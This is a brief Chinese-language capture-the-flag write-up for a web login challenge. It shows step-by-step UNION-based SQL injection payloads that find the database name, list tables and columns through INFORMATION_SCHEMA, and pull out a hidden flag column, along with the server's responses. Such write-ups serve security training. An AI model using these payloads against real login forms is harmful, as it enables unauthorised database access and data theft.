# inndy web login as admin 0.1
* [題目](https://hackme.inndy.tw/login0/)
1. 用前一題方法進入會得到: 
```
Hi, admin
You are admin!
FLAG{\' UNION SELECT "I Know SQL Injection" #}, flag2 in the database!
```
2. 先看看現在在哪個 database
```
輸入 \'  UNION SELECT 1,DATABASE(),3,4#
得到:
Hi, login_as_admin0
You are admin!
FLAG{\' UNION SELECT "I Know SQL Injection" #}, flag2 in the database!
```
3. 知道 database 為 login_as_admin0 後，看看有那些 table
```
輸入: 
\' UNION SELECT 1, TABLE_NAME, 3, 4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="login_as_admin0"#

得到:
Hi, h1dden_f14g
You are admin!
FLAG{\' UNION SELECT "I Know SQL Injection" #}, flag2 in the database!
```
4. 知道有個 table_name 叫做 h1dden_f14g，看裡面有哪些 column
```
輸入: 
\' UNION SELECT 1, COLUMN_NAME, 3, 4 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA="login_as_admin0" AND TABLE_NAME="h1dden_f14g"#

得到:
Hi, the_f14g
You are admin!
FLAG{\' UNION SELECT "I Know SQL Injection" #}, flag2 in the database!
```
5. 知道有個 column 叫做 the_f14g，把裡面東西拿出來
```
輸入:
\' UNION SELECT 1, the_f14g, 3, 4 FROM h1dden_f14g#
就得到 flag 了
```